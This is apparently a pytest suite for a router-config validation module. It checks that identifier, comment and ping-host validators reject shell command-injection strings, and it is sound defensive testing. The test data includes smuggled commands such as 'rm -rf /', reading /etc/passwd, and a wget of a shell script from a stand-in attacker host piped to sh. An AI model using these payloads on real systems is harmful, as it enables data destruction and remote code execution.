"""Tests for config_base module - schema validation and security checks."""

import pytest

from wanctl.config_base import (
    BaseConfig,
    ConfigValidationError,
    _get_nested,
    _type_name,
    validate_field,
    validate_schema,
)


class TestGetNested:
    """Tests for _get_nested helper function."""

    def test_simple_key(self):
        """Test getting a top-level key."""
        data = {"key": "value"}
        assert _get_nested(data, "key") == "value"

    def test_nested_key(self):
        """Test getting a nested key with dot notation."""
        data = {"level1": {"level2": {"level3": "deep_value"}}}
        assert _get_nested(data, "level1.level2.level3") == "deep_value"

    def test_missing_key_returns_default(self):
        """Test that missing keys return the default value."""
        data = {"existing": "value"}
        assert _get_nested(data, "missing") is None
        assert _get_nested(data, "missing", "default") == "default"

    def test_missing_nested_key(self):
        """Test that missing nested keys return default."""
        data = {"level1": {"level2": "value"}}
        assert _get_nested(data, "level1.missing") is None
        assert _get_nested(data, "level1.level2.level3") is None

    def test_non_dict_in_path(self):
        """Test handling when path traverses a non-dict value."""
        data = {"level1": "string_value"}
        assert _get_nested(data, "level1.level2") is None


class TestTypeName:
    """Tests for _type_name helper function."""

    def test_none_value(self):
        """Test that None returns 'null'."""
        assert _type_name(None) == "null"

    def test_string_value(self):
        """Test string type name."""
        assert _type_name("hello") == "str"

    def test_int_value(self):
        """Test int type name."""
        assert _type_name(42) == "int"

    def test_dict_value(self):
        """Test dict type name."""
        assert _type_name({}) == "dict"

    def test_list_value(self):
        """Test list type name."""
        assert _type_name([]) == "list"


class TestValidateField:
    """Tests for validate_field function."""

    def test_valid_string_field(self):
        """Test validating a valid string field."""
        data = {"name": "test_value"}
        result = validate_field(data, "name", str)
        assert result == "test_value"

    def test_valid_nested_field(self):
        """Test validating a nested field."""
        data = {"router": {"host": "192.168.1.1"}}
        result = validate_field(data, "router.host", str)
        assert result == "192.168.1.1"

    def test_missing_required_field_raises(self):
        """Test that missing required field raises error."""
        data = {"other": "value"}
        with pytest.raises(ConfigValidationError) as exc_info:
            validate_field(data, "missing", str, required=True)
        assert "Missing required field" in str(exc_info.value)

    def test_missing_optional_field_returns_default(self):
        """Test that missing optional field returns default."""
        data = {"other": "value"}
        result = validate_field(data, "missing", str, required=False, default="default")
        assert result == "default"

    def test_wrong_type_raises(self):
        """Test that wrong type raises error."""
        data = {"number": "not_a_number"}
        with pytest.raises(ConfigValidationError) as exc_info:
            validate_field(data, "number", int)
        assert "Invalid type" in str(exc_info.value)

    def test_int_coerced_to_float(self):
        """Test that int is automatically coerced to float when expected."""
        data = {"value": 10}
        result = validate_field(data, "value", float)
        assert result == 10.0
        assert isinstance(result, float)

    def test_tuple_of_types(self):
        """Test validating with multiple allowed types."""
        data = {"value": 10}
        result = validate_field(data, "value", (int, float))
        assert result == 10

    def test_min_value_validation(self):
        """Test minimum value validation."""
        data = {"value": 5}
        with pytest.raises(ConfigValidationError) as exc_info:
            validate_field(data, "value", int, min_val=10)
        assert "out of range" in str(exc_info.value)
        assert "minimum" in str(exc_info.value)

    def test_max_value_validation(self):
        """Test maximum value validation."""
        data = {"value": 100}
        with pytest.raises(ConfigValidationError) as exc_info:
            validate_field(data, "value", int, max_val=50)
        assert "out of range" in str(exc_info.value)
        assert "maximum" in str(exc_info.value)

    def test_value_within_range(self):
        """Test value within valid range."""
        data = {"value": 50}
        result = validate_field(data, "value", int, min_val=10, max_val=100)
        assert result == 50

    def test_choices_validation_valid(self):
        """Test choices validation with valid value."""
        data = {"mode": "fast"}
        result = validate_field(data, "mode", str, choices=["slow", "fast", "turbo"])
        assert result == "fast"

    def test_choices_validation_invalid(self):
        """Test choices validation with invalid value."""
        data = {"mode": "invalid"}
        with pytest.raises(ConfigValidationError) as exc_info:
            validate_field(data, "mode", str, choices=["slow", "fast", "turbo"])
        assert "Invalid value" in str(exc_info.value)
        assert "Must be one of" in str(exc_info.value)


class TestValidateSchema:
    """Tests for validate_schema function."""

    def test_valid_schema(self):
        """Test validating a complete valid schema."""
        data = {
            "name": "test",
            "router": {"host": "192.168.1.1"},
            "value": 50
        }
        schema = [
            {"path": "name", "type": str, "required": True},
            {"path": "router.host", "type": str, "required": True},
            {"path": "value", "type": int, "min": 1, "max": 100},
        ]
        result = validate_schema(data, schema)
        assert result["name"] == "test"
        assert result["router.host"] == "192.168.1.1"
        assert result["value"] == 50

    def test_schema_with_defaults(self):
        """Test schema validation with default values."""
        data = {"name": "test"}
        schema = [
            {"path": "name", "type": str, "required": True},
            {"path": "optional", "type": str, "required": False, "default": "default_val"},
        ]
        result = validate_schema(data, schema)
        assert result["name"] == "test"
        assert result["optional"] == "default_val"

    def test_schema_multiple_errors(self):
        """Test that schema validation collects all errors."""
        data = {"name": 123}  # Wrong type, missing required fields
        schema = [
            {"path": "name", "type": str, "required": True},
            {"path": "host", "type": str, "required": True},
            {"path": "port", "type": int, "required": True},
        ]
        with pytest.raises(ConfigValidationError) as exc_info:
            validate_schema(data, schema)
        error_msg = str(exc_info.value)
        assert "3 error(s)" in error_msg


class TestBaseConfigValidation:
    """Tests for BaseConfig security validation methods."""

    def test_validate_identifier_valid(self):
        """Test validating valid identifiers."""
        assert BaseConfig.validate_identifier("WAN-Download-ATT", "test") == "WAN-Download-ATT"
        assert BaseConfig.validate_identifier("queue_name", "test") == "queue_name"
        assert BaseConfig.validate_identifier("ether1.100", "test") == "ether1.100"

    def test_validate_identifier_empty(self):
        """Test that empty identifier raises error."""
        with pytest.raises(ConfigValidationError) as exc_info:
            BaseConfig.validate_identifier("", "field_name")
        assert "cannot be empty" in str(exc_info.value)

    def test_validate_identifier_too_long(self):
        """Test that too-long identifier raises error."""
        long_name = "a" * 65
        with pytest.raises(ConfigValidationError) as exc_info:
            BaseConfig.validate_identifier(long_name, "field_name")
        assert "too long" in str(exc_info.value)

    def test_validate_identifier_invalid_chars(self):
        """Test that invalid characters raise error."""
        with pytest.raises(ConfigValidationError) as exc_info:
            BaseConfig.validate_identifier("name;rm -rf /", "field_name")
        assert "invalid characters" in str(exc_info.value)

    def test_validate_identifier_special_chars(self):
        """Test various special characters that should be rejected."""
        invalid_names = [
            "name with space",
            "name`cmd`",
            "name$(cmd)",
            "name|pipe",
            "name&background",
            "name\nnewline",
        ]
        for name in invalid_names:
            with pytest.raises(ConfigValidationError):
                BaseConfig.validate_identifier(name, "test")

    def test_validate_comment_valid(self):
        """Test validating valid comments."""
        assert BaseConfig.validate_comment("ADAPTIVE: Steer to ATT", "test") == "ADAPTIVE: Steer to ATT"
        assert BaseConfig.validate_comment("Simple comment", "test") == "Simple comment"

    def test_validate_comment_empty(self):
        """Test that empty comment raises error."""
        with pytest.raises(ConfigValidationError) as exc_info:
            BaseConfig.validate_comment("", "field_name")
        assert "cannot be empty" in str(exc_info.value)

    def test_validate_comment_too_long(self):
        """Test that too-long comment raises error."""
        long_comment = "a" * 129
        with pytest.raises(ConfigValidationError) as exc_info:
            BaseConfig.validate_comment(long_comment, "field_name")
        assert "too long" in str(exc_info.value)

    def test_validate_comment_invalid_chars(self):
        """Test that dangerous characters in comments raise error."""
        with pytest.raises(ConfigValidationError) as exc_info:
            BaseConfig.validate_comment("comment;rm -rf /", "field_name")
        assert "invalid characters" in str(exc_info.value)

    def test_validate_identifier_non_string(self):
        """Test that non-string identifier raises error."""
        with pytest.raises(ConfigValidationError) as exc_info:
            BaseConfig.validate_identifier(123, "field_name")
        assert "expected string" in str(exc_info.value)

    def test_validate_comment_non_string(self):
        """Test that non-string comment raises error."""
        with pytest.raises(ConfigValidationError) as exc_info:
            BaseConfig.validate_comment(123, "field_name")
        assert "expected string" in str(exc_info.value)


class TestValidatePingHost:
    """Tests for validate_ping_host security validation."""

    # -------------------------------------------------------------------------
    # Valid inputs
    # -------------------------------------------------------------------------

    def test_valid_ipv4_addresses(self):
        """Test valid IPv4 addresses are accepted."""
        valid_ipv4s = [
            "1.1.1.1",
            "8.8.8.8",
            "192.168.1.1",
            "10.0.0.1",
            "255.255.255.255",
            "0.0.0.0",
        ]
        for ip in valid_ipv4s:
            result = BaseConfig.validate_ping_host(ip, "ping_host")
            assert result == ip

    def test_valid_ipv6_addresses(self):
        """Test valid IPv6 addresses are accepted."""
        valid_ipv6s = [
            "2001:4860:4860::8888",
            "2001:4860:4860::8844",
            "::1",
            "fe80::1",
            "2607:f8b0:4004:800::200e",
        ]
        for ip in valid_ipv6s:
            result = BaseConfig.validate_ping_host(ip, "ping_host")
            assert result == ip

    def test_valid_hostnames(self):
        """Test valid hostnames are accepted."""
        valid_hostnames = [
            "dns.google",
            "cloudflare.com",
            "one.one.one.one",
            "example.com",
            "sub.domain.example.org",
            "a.b.c.d.e.f.example.com",
        ]
        for hostname in valid_hostnames:
            result = BaseConfig.validate_ping_host(hostname, "ping_host")
            assert result == hostname

    def test_valid_single_label_hostname(self):
        """Test single-label hostnames are valid."""
        assert BaseConfig.validate_ping_host("localhost", "host") == "localhost"
        assert BaseConfig.validate_ping_host("router", "host") == "router"

    def test_hostname_with_numbers(self):
        """Test hostnames containing numbers are valid."""
        assert BaseConfig.validate_ping_host("ns1.google.com", "host") == "ns1.google.com"
        assert BaseConfig.validate_ping_host("1e100.net", "host") == "1e100.net"

    def test_hostname_with_hyphens(self):
        """Test hostnames with hyphens are valid."""
        assert BaseConfig.validate_ping_host("my-router.local", "host") == "my-router.local"
        assert BaseConfig.validate_ping_host("test-1-2-3.example.com", "host") == "test-1-2-3.example.com"

    # -------------------------------------------------------------------------
    # Command injection attacks (security-critical)
    # -------------------------------------------------------------------------

    def test_command_injection_semicolon(self):
        """Test that semicolon injection is rejected."""
        with pytest.raises(ConfigValidationError) as exc_info:
            BaseConfig.validate_ping_host("127.0.0.1; cat /etc/passwd", "ping_host")
        assert "must be valid IPv4, IPv6" in str(exc_info.value)

    def test_command_injection_backticks(self):
        """Test that backtick command substitution is rejected."""
        with pytest.raises(ConfigValidationError) as exc_info:
            BaseConfig.validate_ping_host("`whoami`", "ping_host")
        assert "must be valid IPv4, IPv6" in str(exc_info.value)

    def test_command_injection_dollar_paren(self):
        """Test that $() command substitution is rejected."""
        with pytest.raises(ConfigValidationError) as exc_info:
            BaseConfig.validate_ping_host("$(whoami)", "ping_host")
        assert "must be valid IPv4, IPv6" in str(exc_info.value)

    def test_command_injection_pipe(self):
        """Test that pipe injection is rejected."""
        with pytest.raises(ConfigValidationError) as exc_info:
            BaseConfig.validate_ping_host("127.0.0.1 | rm -rf /", "ping_host")
        assert "must be valid IPv4, IPv6" in str(exc_info.value)

    def test_command_injection_ampersand(self):
        """Test that ampersand injection is rejected."""
        with pytest.raises(ConfigValidationError) as exc_info:
            BaseConfig.validate_ping_host("127.0.0.1 && rm -rf /", "ping_host")
        assert "must be valid IPv4, IPv6" in str(exc_info.value)

    def test_command_injection_newline(self):
        """Test that newline injection is rejected."""
        with pytest.raises(ConfigValidationError) as exc_info:
            BaseConfig.validate_ping_host("127.0.0.1\nrm -rf /", "ping_host")
        assert "must be valid IPv4, IPv6" in str(exc_info.value)

    def test_command_injection_redirect(self):
        """Test that redirect injection is rejected."""
        with pytest.raises(ConfigValidationError) as exc_info:
            BaseConfig.validate_ping_host("127.0.0.1 > /tmp/pwned", "ping_host")
        assert "must be valid IPv4, IPv6" in str(exc_info.value)

    def test_command_injection_variable_expansion(self):
        """Test that shell variable expansion is rejected."""
        with pytest.raises(ConfigValidationError) as exc_info:
            BaseConfig.validate_ping_host("${PATH}", "ping_host")
        assert "must be valid IPv4, IPv6" in str(exc_info.value)

    def test_command_injection_complex_payload(self):
        """Test complex injection payloads are rejected."""
        payloads = [
            "1.1.1.1;id",
            "1.1.1.1|id",
            "1.1.1.1`id`",
            "1.1.1.1$(id)",
            "a]&&id||[",
            "google.com;wget attacker.com/shell.sh|sh",
        ]
        for payload in payloads:
            with pytest.raises(ConfigValidationError):
                BaseConfig.validate_ping_host(payload, "ping_host")

    # -------------------------------------------------------------------------
    # Invalid hostname patterns
    # -------------------------------------------------------------------------

    def test_hostname_starting_with_hyphen(self):
        """Test hostname starting with hyphen is invalid."""
        with pytest.raises(ConfigValidationError):
            BaseConfig.validate_ping_host("-invalid.com", "host")

    def test_hostname_ending_with_hyphen(self):
        """Test hostname ending with hyphen is invalid."""
        with pytest.raises(ConfigValidationError):
            BaseConfig.validate_ping_host("invalid-.com", "host")

    def test_hostname_with_underscore(self):
        """Test hostname with underscore is invalid (per RFC)."""
        # Note: underscores are technically invalid in hostnames per RFC 1123
        # but some systems accept them. This tests the strict validation.
        with pytest.raises(ConfigValidationError):
            BaseConfig.validate_ping_host("invalid_host.com", "host")

    def test_hostname_with_spaces(self):
        """Test hostname with spaces is invalid."""
        with pytest.raises(ConfigValidationError):
            BaseConfig.validate_ping_host("invalid host.com", "host")

    def test_hostname_label_too_long(self):
        """Test hostname with label > 63 chars is invalid."""
        long_label = "a" * 64 + ".com"
        with pytest.raises(ConfigValidationError):
            BaseConfig.validate_ping_host(long_label, "host")

    # -------------------------------------------------------------------------
    # IPv4-like patterns behavior
    # Note: These strings match the hostname regex even though they look like
    # malformed IPv4. This is expected behavior since the validator accepts
    # valid hostnames, and "256.1.1.1" is a valid hostname syntax-wise.
    # -------------------------------------------------------------------------

    def test_ipv4_like_strings_accepted_as_hostnames(self):
        """Test that IPv4-like strings are accepted as valid hostnames.

        The validator checks: valid IPv4 OR valid IPv6 OR valid hostname.
        Strings like '256.1.1.1' or '192.168.1' fail IPv4 validation but
        pass hostname validation (since they're syntactically valid hostnames).
        This is correct behavior - DNS could resolve these names.
        """
        # These fail IPv4 validation but pass hostname validation
        assert BaseConfig.validate_ping_host("256.1.1.1", "ping_host") == "256.1.1.1"
        assert BaseConfig.validate_ping_host("192.168.1", "ping_host") == "192.168.1"
        assert BaseConfig.validate_ping_host("192.168.1.1.1", "ping_host") == "192.168.1.1.1"

    def test_invalid_ipv4_negative_octet(self):
        """Test IPv4 with negative octet is rejected (hyphen at start of label)."""
        with pytest.raises(ConfigValidationError):
            BaseConfig.validate_ping_host("-1.1.1.1", "ping_host")

    # -------------------------------------------------------------------------
    # Edge cases
    # -------------------------------------------------------------------------

    def test_empty_string_rejected(self):
        """Test empty string is rejected."""
        with pytest.raises(ConfigValidationError) as exc_info:
            BaseConfig.validate_ping_host("", "ping_host")
        assert "cannot be empty" in str(exc_info.value)

    def test_non_string_rejected(self):
        """Test non-string input is rejected."""
        with pytest.raises(ConfigValidationError) as exc_info:
            BaseConfig.validate_ping_host(123, "ping_host")
        assert "expected string" in str(exc_info.value)

    def test_none_rejected(self):
        """Test None is rejected."""
        with pytest.raises(ConfigValidationError) as exc_info:
            BaseConfig.validate_ping_host(None, "ping_host")
        assert "expected string" in str(exc_info.value)

    def test_list_rejected(self):
        """Test list is rejected."""
        with pytest.raises(ConfigValidationError) as exc_info:
            BaseConfig.validate_ping_host(["1.1.1.1"], "ping_host")
        assert "expected string" in str(exc_info.value)

    def test_too_long_rejected(self):
        """Test string exceeding max length is rejected."""
        long_host = "a." * 130  # 260 chars > 256 max
        with pytest.raises(ConfigValidationError) as exc_info:
            BaseConfig.validate_ping_host(long_host, "ping_host")
        assert "too long" in str(exc_info.value)


class TestValidateIdentifierSecurityEdgeCases:
    """Additional security edge cases for validate_identifier."""

    def test_command_injection_dollar_paren(self):
        """Test $() command substitution is rejected."""
        with pytest.raises(ConfigValidationError):
            BaseConfig.validate_identifier("queue$(id)", "queue_name")

    def test_command_injection_backticks(self):
        """Test backtick command substitution is rejected."""
        with pytest.raises(ConfigValidationError):
            BaseConfig.validate_identifier("queue`id`", "queue_name")

    def test_shell_variable_expansion(self):
        """Test shell variable expansion is rejected."""
        with pytest.raises(ConfigValidationError):
            BaseConfig.validate_identifier("queue${PATH}", "queue_name")

    def test_double_quotes(self):
        """Test double quotes are rejected."""
        with pytest.raises(ConfigValidationError):
            BaseConfig.validate_identifier('queue"injection', "queue_name")

    def test_single_quotes(self):
        """Test single quotes are rejected."""
        with pytest.raises(ConfigValidationError):
            BaseConfig.validate_identifier("queue'injection", "queue_name")

    def test_hash_comment(self):
        """Test hash comment injection is rejected."""
        with pytest.raises(ConfigValidationError):
            BaseConfig.validate_identifier("queue#comment", "queue_name")

    def test_newline_with_command(self):
        """Test newline followed by command is rejected."""
        with pytest.raises(ConfigValidationError):
            BaseConfig.validate_identifier("queue\nrm -rf /", "queue_name")

    def test_carriage_return_injection(self):
        """Test carriage return injection is rejected."""
        with pytest.raises(ConfigValidationError):
            BaseConfig.validate_identifier("queue\r\nrm -rf /", "queue_name")

    def test_null_byte_injection(self):
        """Test null byte injection is rejected."""
        with pytest.raises(ConfigValidationError):
            BaseConfig.validate_identifier("queue\x00command", "queue_name")

    def test_unicode_bypass_attempt(self):
        """Test unicode lookalike characters are rejected."""
        # Using a unicode semicolon (GREEK QUESTION MARK U+037E looks like ;)
        with pytest.raises(ConfigValidationError):
            BaseConfig.validate_identifier("queue\u037Ecommand", "queue_name")


class TestValidateCommentSecurityEdgeCases:
    """Additional security edge cases for validate_comment."""

    def test_double_quotes_rejected(self):
        """Test double quotes are rejected in comments."""
        with pytest.raises(ConfigValidationError):
            BaseConfig.validate_comment('comment"injection', "comment")

    def test_single_quotes_rejected(self):
        """Test single quotes are rejected in comments."""
        with pytest.raises(ConfigValidationError):
            BaseConfig.validate_comment("comment'injection", "comment")

    def test_backticks_rejected(self):
        """Test backticks are rejected in comments."""
        with pytest.raises(ConfigValidationError):
            BaseConfig.validate_comment("comment`id`", "comment")

    def test_dollar_paren_rejected(self):
        """Test $() is rejected in comments."""
        with pytest.raises(ConfigValidationError):
            BaseConfig.validate_comment("comment$(id)", "comment")

    def test_shell_variable_rejected(self):
        """Test shell variables are rejected in comments."""
        with pytest.raises(ConfigValidationError):
            BaseConfig.validate_comment("comment${PATH}", "comment")

    def test_newline_injection_rejected(self):
        """Test newline injection is rejected."""
        with pytest.raises(ConfigValidationError):
            BaseConfig.validate_comment("comment\nrm -rf /", "comment")

    def test_pipe_rejected(self):
        """Test pipe character is rejected."""
        with pytest.raises(ConfigValidationError):
            BaseConfig.validate_comment("comment|command", "comment")

    def test_semicolon_rejected(self):
        """Test semicolon is rejected."""
        with pytest.raises(ConfigValidationError):
            BaseConfig.validate_comment("comment;rm -rf /", "comment")

    def test_ampersand_rejected(self):
        """Test ampersand is rejected."""
        with pytest.raises(ConfigValidationError):
            BaseConfig.validate_comment("comment&&rm -rf /", "comment")

    def test_redirect_rejected(self):
        """Test redirect characters are rejected."""
        with pytest.raises(ConfigValidationError):
            BaseConfig.validate_comment("comment>/tmp/pwned", "comment")

    def test_parentheses_rejected(self):
        """Test parentheses are rejected."""
        with pytest.raises(ConfigValidationError):
            BaseConfig.validate_comment("comment(subshell)", "comment")

    def test_valid_adaptive_steer_comment(self):
        """Test the actual production comment format is valid."""
        comment = "ADAPTIVE: Steer latency-sensitive to ATT"
        result = BaseConfig.validate_comment(comment, "mangle_comment")
        assert result == comment

    def test_valid_rule_name_comment(self):
        """Test rule name with allowed characters."""
        comment = "Rule-Name_123: Description here"
        result = BaseConfig.validate_comment(comment, "mangle_comment")
        assert result == comment
